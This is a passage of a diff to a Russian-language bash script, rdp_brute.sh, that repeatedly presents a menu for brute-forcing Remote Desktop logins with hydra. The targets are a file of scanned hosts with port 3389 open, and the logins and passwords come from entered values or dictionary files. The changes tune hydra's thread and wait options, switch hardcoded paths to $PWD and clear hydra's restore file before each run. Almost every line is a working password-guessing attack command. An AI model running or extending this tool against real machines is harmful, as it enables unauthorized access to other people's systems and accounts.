 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6912,7 +7288,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6922,7 +7298,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6931,7 +7307,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6960,6 +7336,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6971,7 +7351,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6981,7 +7361,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6991,7 +7371,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7000,7 +7380,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7029,6 +7409,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7040,7 +7424,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7050,7 +7434,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7060,7 +7444,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7069,7 +7453,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7098,6 +7482,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7109,7 +7497,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7119,7 +7507,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7129,7 +7517,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7138,7 +7526,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7167,6 +7555,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7178,7 +7570,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7188,7 +7580,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7198,7 +7590,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7207,7 +7599,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7236,6 +7628,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7247,7 +7643,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7257,7 +7653,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7267,7 +7663,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7276,7 +7672,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7305,6 +7701,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7316,7 +7716,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7326,7 +7726,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7336,7 +7736,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7345,7 +7745,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7374,6 +7774,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7385,7 +7789,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7395,7 +7799,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7405,7 +7809,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7414,7 +7818,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7443,6 +7847,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7454,7 +7862,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7464,7 +7872,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7474,7 +7882,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7483,7 +7891,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7512,6 +7920,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7523,7 +7935,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7533,7 +7945,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7543,7 +7955,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7552,7 +7964,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7581,6 +7993,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7592,7 +8008,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7602,7 +8018,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7612,7 +8028,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7621,7 +8037,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7650,6 +8066,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7661,7 +8081,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7671,7 +8091,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7681,7 +8101,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7690,7 +8110,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7719,6 +8139,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7730,7 +8154,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
